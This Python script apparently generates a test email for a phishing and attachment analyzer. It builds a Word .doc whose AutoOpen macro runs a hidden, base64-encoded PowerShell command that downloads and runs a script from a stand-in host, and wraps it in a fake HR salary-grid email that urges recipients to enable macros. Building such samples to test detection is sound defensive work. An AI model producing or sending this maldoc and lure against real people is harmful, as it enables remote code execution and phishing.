#!/usr/bin/env python3
"""
Génère un .eml avec un vrai fichier .doc OLE contenant une macro VBA AutoOpen.
Structure OLE/CFB conforme MS-OVBA pour déclencher olevba correctement.
"""
import os, struct
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO

# ─── MS-OVBA compression (mode non-compressé) ─────────────────────────────────
def ovba_compress(data: bytes) -> bytes:
    """Encapsule des données brutes dans un MS-OVBA CompressedContainer (chunks non-compressés)."""
    result = bytearray(b'\x01')  # SignatureByte
    padded = data + b'\x00' * ((4096 - len(data) % 4096) % 4096)
    for i in range(0, len(padded), 4096):
        chunk = padded[i:i+4096]
        # header: bits 0-11 = 0xFFF (4095), bits 12-14 = 0b011, bit 15 = 0 (uncompressed)
        # chunk_size = (0xFFF) + 3 = 4098 => 2 header + 4096 data, flag=uncompressed
        header = 0x3FFF
        result += struct.pack('<H', header) + chunk
    return bytes(result)


# ─── Construction du dir stream ───────────────────────────────────────────────
def build_dir_stream(module_name: str = 'Module1', text_offset: int = 0) -> bytes:
    """Construit le dir stream MS-OVBA 2.3.4 pour un projet VBA avec un module procédural."""
    def rec(id_, data: bytes) -> bytes:
        return struct.pack('<HI', id_, len(data)) + data

    d = BytesIO()

    # PROJECTSYSKIND
    d.write(rec(0x0001, struct.pack('<I', 0x00000001)))  # Win32
    # PROJECTLCID
    d.write(rec(0x0002, struct.pack('<I', 0x00000409)))  # English
    # PROJECTLCIDINVOKE
    d.write(rec(0x0014, struct.pack('<I', 0x00000409)))
    # PROJECTCODEPAGE
    d.write(rec(0x0003, struct.pack('<H', 1252)))
    # PROJECTNAME
    d.write(rec(0x0004, b'VBAProject'))
    # PROJECTDOCSTRING
    d.write(rec(0x0005, b''))
    d.write(rec(0x0040, b''))  # unicode variant
    # PROJECTHELPFILEPATH
    d.write(rec(0x0006, b''))
    d.write(rec(0x003D, b''))
    # PROJECTHELPCONTEXT
    d.write(rec(0x0007, struct.pack('<I', 0)))
    # PROJECTLIBFLAGS
    d.write(rec(0x0008, struct.pack('<I', 0)))
    # PROJECTVERSION (special: no size for MinorVersion)
    d.write(struct.pack('<H', 0x0009))     # Id
    d.write(struct.pack('<I', 0x0004))     # Reserved (size of MajorVersion)
    d.write(struct.pack('<I', 0x61580000)) # MajorVersion
    d.write(struct.pack('<H', 0x000E))     # MinorVersion
    # PROJECTCONSTANTS
    d.write(rec(0x000C, b''))
    d.write(rec(0x003C, b''))  # unicode variant

    # No REFERENCE records → go straight to PROJECTMODULES

    # PROJECTMODULES header (id already consumed by the references loop in olevba → write it here)
    d.write(struct.pack('<H', 0x000F))         # PROJECTMODULES Id
    d.write(struct.pack('<I', 0x0002))         # Size = 2
    d.write(struct.pack('<H', 1))              # Count = 1 module
    # PROJECTCOOKIE
    d.write(rec(0x0013, struct.pack('<H', 0xFFFF)))

    # MODULE record
    mn = module_name.encode('latin-1')
    mn_u = module_name.encode('utf-16-le')

    # MODULENAME
    d.write(rec(0x0019, mn))
    # MODULENAMEUNICODE
    d.write(rec(0x0047, mn_u))
    # MODULESTREAMNAME
    d.write(rec(0x001A, mn))
    d.write(rec(0x0032, mn_u))  # unicode variant
    # MODULEDOCSTRING
    d.write(rec(0x001C, b''))
    d.write(rec(0x0048, b''))   # unicode variant
    # MODULEOFFSET
    d.write(rec(0x0031, struct.pack('<I', text_offset)))
    # MODULEHELPCONTEXT
    d.write(rec(0x001E, struct.pack('<I', 0)))
    # MODULECOOKIE
    d.write(rec(0x002C, struct.pack('<H', 0xFFFF)))
    # MODULETYPE: procedural module (no data, just id + reserved=0)
    d.write(struct.pack('<H', 0x0021))
    d.write(struct.pack('<I', 0x00000000))
    # MODULE TERMINATOR
    d.write(struct.pack('<H', 0x002B))
    d.write(struct.pack('<I', 0x00000000))

    # PROJECTMODULES terminator
    d.write(struct.pack('<H', 0x0010))
    d.write(struct.pack('<I', 0x00000000))

    return d.getvalue()


# ─── Construction de l'OLE Compound File Binary ───────────────────────────────
def build_ole_with_vba(vba_source: str) -> bytes:
    """
    Construit un fichier OLE/CFB .doc minimal avec un projet VBA contenant
    une macro AutoOpen avec Shell/CreateObject/PowerShell.

    Structure OLE :
    Root
    └── VBA (storage)  ← vba_root détecté par olevba
        ├── _VBA_PROJECT (stream)  ← signature du projet VBA
        ├── dir (stream)           ← répertoire des modules (compressé)
        └── Module1 (stream)       ← code source VBA (compressé)
    """
    FREESECT    = 0xFFFFFFFF
    ENDOFCHAIN  = 0xFFFFFFFE
    FATSECT     = 0xFFFFFFFD
    NOSTREAM    = 0xFFFFFFFF

    vba_bytes = vba_source.encode('latin-1')

    # Streams à embarquer
    # PROJECT stream requis par olevba à la racine (vba_root) en plus de VBA/
    project_data     = b'ID="{00000000-0000-0000-0000-000000000000}"\r\nDocument=Module1/&H00000000\r\nHelpContextID=0\r\nVersionCompatible32=393222000\r\n'
    vba_project_data = b'\xCC\x61' + b'\x00' * 10   # version header minimal
    dir_data         = ovba_compress(build_dir_stream('Module1', text_offset=0))
    module_data      = ovba_compress(vba_bytes)

    def sectors_for(data: bytes) -> list:
        """Découpe data en blocs de 512 bytes."""
        padded = data + b'\x00' * ((512 - len(data) % 512) % 512)
        return [padded[i:i+512] for i in range(0, len(padded), 512)]

    proj_sects  = sectors_for(project_data)
    vbp_sects   = sectors_for(vba_project_data)
    dir_sects   = sectors_for(dir_data)
    mod_sects   = sectors_for(module_data)

    # Attribution des numéros de secteurs
    # 0 = FAT, 1-2 = Directory, puis streams en séquence
    SECT_FAT  = 0
    SECT_DIR1 = 1
    SECT_DIR2 = 2
    cur = 3
    SECT_PROJ = cur; cur += len(proj_sects)
    SECT_VBP  = cur; cur += len(vbp_sects)
    SECT_DIR  = cur; cur += len(dir_sects)
    SECT_MOD  = cur; cur += len(mod_sects)
    total_sectors = cur

    # ── FAT ──
    fat = [FREESECT] * 128
    fat[SECT_FAT]  = FATSECT
    fat[SECT_DIR1] = SECT_DIR2
    fat[SECT_DIR2] = ENDOFCHAIN
    for s, blks in [(SECT_PROJ, proj_sects), (SECT_VBP, vbp_sects),
                    (SECT_DIR, dir_sects), (SECT_MOD, mod_sects)]:
        for i in range(len(blks) - 1):
            fat[s + i] = s + i + 1
        fat[s + len(blks) - 1] = ENDOFCHAIN

    fat_sector = b''.join(struct.pack('<I', f) for f in fat)

    # ── Directory (2 sectors = 8 entries × 128 bytes) ──
    def dir_entry(name: str, etype: int, color: int,
                  child: int, left: int, right: int,
                  start: int, size: int) -> bytes:
        e = bytearray(128)
        enc = name.encode('utf-16-le')
        e[0:len(enc)] = enc
        struct.pack_into('<H', e, 64, len(enc) + 2 if name else 0)
        e[66] = etype
        e[67] = color
        struct.pack_into('<I', e, 68, left)
        struct.pack_into('<I', e, 72, right)
        struct.pack_into('<I', e, 76, child)
        struct.pack_into('<I', e, 116, start)
        struct.pack_into('<I', e, 120, size)
        return bytes(e)

    entries = [
        # 0: Root Entry (storage, child → VBA at SID 1)
        dir_entry('Root Entry', 5, 1, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),
        # 1: VBA (storage, child → _VBA_PROJECT at SID 3, left sibling → PROJECT at SID 5)
        dir_entry('VBA', 1, 1, 3, 5, NOSTREAM, ENDOFCHAIN, 0),
        # 2: empty
        dir_entry('', 0, 1, NOSTREAM, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),
        # 3: _VBA_PROJECT (stream, right → dir at SID 4)
        dir_entry('_VBA_PROJECT', 2, 1, NOSTREAM, NOSTREAM, 4, SECT_VBP, len(vba_project_data)),
        # 4: dir (stream, right → Module1 at SID 6 ... using 6 for Module1 inside VBA storage)
        dir_entry('dir', 2, 1, NOSTREAM, NOSTREAM, 6, SECT_DIR, len(dir_data)),
        # 5: PROJECT (stream at root level, sibling of VBA)
        dir_entry('PROJECT', 2, 1, NOSTREAM, NOSTREAM, NOSTREAM, SECT_PROJ, len(project_data)),
        # 6: Module1 (stream inside VBA storage)
        dir_entry('Module1', 2, 1, NOSTREAM, NOSTREAM, NOSTREAM, SECT_MOD, len(module_data)),
        # 7: empty
        dir_entry('', 0, 1, NOSTREAM, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),
    ]
    dir_sector1 = b''.join(entries[0:4])
    dir_sector2 = b''.join(entries[4:8])

    # ── OLE Header (512 bytes) ──
    header = bytearray(512)
    header[0:8]   = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'  # Magic
    struct.pack_into('<H', header, 0x18, 0x003E)  # Minor version
    struct.pack_into('<H', header, 0x1A, 0x0003)  # Major version (512-byte sectors)
    struct.pack_into('<H', header, 0x1C, 0xFFFE)  # Little-endian
    struct.pack_into('<H', header, 0x1E, 0x0009)  # Sector size = 2^9 = 512
    struct.pack_into('<H', header, 0x20, 0x0006)  # Mini-sector size = 2^6 = 64
    struct.pack_into('<I', header, 0x2C, 1)        # Total FAT sectors
    struct.pack_into('<I', header, 0x30, SECT_DIR1) # First dir sector
    struct.pack_into('<I', header, 0x38, 0x1000)   # Mini-stream cutoff = 4096
    struct.pack_into('<I', header, 0x3C, ENDOFCHAIN) # No mini-FAT
    struct.pack_into('<I', header, 0x40, 0)        # Mini-FAT sectors
    struct.pack_into('<I', header, 0x44, ENDOFCHAIN) # No DIFAT
    struct.pack_into('<I', header, 0x48, 0)        # DIFAT sectors
    # DIFAT array: first entry = sector 0 (FAT), rest = FREESECT
    struct.pack_into('<I', header, 0x4C, SECT_FAT)
    for i in range(1, 109):
        struct.pack_into('<I', header, 0x4C + i * 4, FREESECT)

    data_sectors = (b''.join(proj_sects) + b''.join(vbp_sects)
                    + b''.join(dir_sects) + b''.join(mod_sects))

    return (bytes(header)
            + fat_sector
            + dir_sector1
            + dir_sector2
            + data_sectors)


# ─── Génération de l'EML ──────────────────────────────────────────────────────
VBA_SOURCE = (
    'Attribute VB_Name = "Module1"\r\n'
    'Sub AutoOpen()\r\n'
    '    Dim cmd As String\r\n'
    '    cmd = "powershell -WindowStyle Hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="\r\n'
    '    Shell cmd, vbHide\r\n'
    '    CreateObject("WScript.Shell").Run cmd, 0, False\r\n'
    'End Sub\r\n'
    '\r\n'
    'Sub Document_Open()\r\n'
    '    AutoOpen\r\n'
    'End Sub\r\n'
)


def gen_06():
    doc_bytes = build_ole_with_vba(VBA_SOURCE)

    msg = MIMEMultipart()
    msg['From'] = '"Direction RH" <rh@acme-corp.fr>'
    msg['To'] = 'collaborateurs@acme-corp.fr'
    msg['Subject'] = 'Grille salariale 2026 - Confidentiel'
    msg['Date'] = 'Mon, 26 May 2026 08:30:00 +0200'
    msg['Message-ID'] = '<20260526083000.fake006@acme-corp.fr>'
    msg['Received'] = (
        'from smtp.acme-corp.fr (91.134.209.12) by mx.acme-corp.fr with SMTP; '
        'Mon, 26 May 2026 08:30:05 +0200'
    )

    body = MIMEText(
        'Bonjour,\n\n'
        'Veuillez trouver ci-joint la grille salariale 2026.\n'
        'Ce document est strictement confidentiel.\n\n'
        'Activez les macros pour afficher le contenu protégé.\n\n'
        'Cordialement,\nDirection des Ressources Humaines',
        'plain', 'utf-8'
    )
    msg.attach(body)

    part = MIMEBase('application', 'msword')
    part.set_payload(doc_bytes)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment',
                    filename='Grille_salariale_2026_CONFIDENTIEL.doc')
    msg.attach(part)

    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'test_emails', '06_vba_autoopen.eml')
    with open(out, 'w') as f:
        f.write(msg.as_string())
    print(f'  ✓ 06_vba_autoopen.eml')


if __name__ == '__main__':
    print('\nGénération de 06_vba_autoopen.eml...\n')
    gen_06()

    # Vérification immédiate avec olevba
    print('\nVérification avec olevba...')
    try:
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'backend', 'app'))
        from analyzers.attachment import analyze_attachment
        import email as _email

        with open('test_emails/06_vba_autoopen.eml') as f:
            msg = _email.message_from_file(f)
        for part in msg.walk():
            if part.get_filename():
                raw = part.get_payload(decode=True)
                r = analyze_attachment(part.get_filename(), part.get_content_type(), raw)
                print(f'  risk         : {r.risk}')
                print(f'  has_macros   : {r.has_macros}')
                print(f'  macro_details: {r.macro_details}')
                print(f'  risk_reasons : {r.risk_reasons}')
    except Exception as e:
        print(f'  (vérification ignorée : {e})')

    print('\nScore attendu : Dangereux (80-100)')
    print('Signaux      : AutoOpen + Shell + CreateObject + WScript + PowerShell\n')
